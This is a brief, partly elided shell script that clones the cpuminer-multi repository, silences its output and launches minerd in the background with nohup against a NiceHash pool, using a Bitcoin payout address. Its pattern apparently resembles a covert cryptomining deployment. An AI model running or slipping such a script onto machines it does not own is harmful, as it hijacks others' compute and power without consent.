...
mkdir miner
git clone https://github.com/wolf9466/cpuminer-multi.git miner > /dev/null
sleep 1
...
sleep 10
cd miner
nohup ./minerd -o stratum+tcp://cryptonight.br.nicehash.com:3355 -u 1FsEWCHZ3312ms67Lp7Hr93uDxxFsPL5yk &
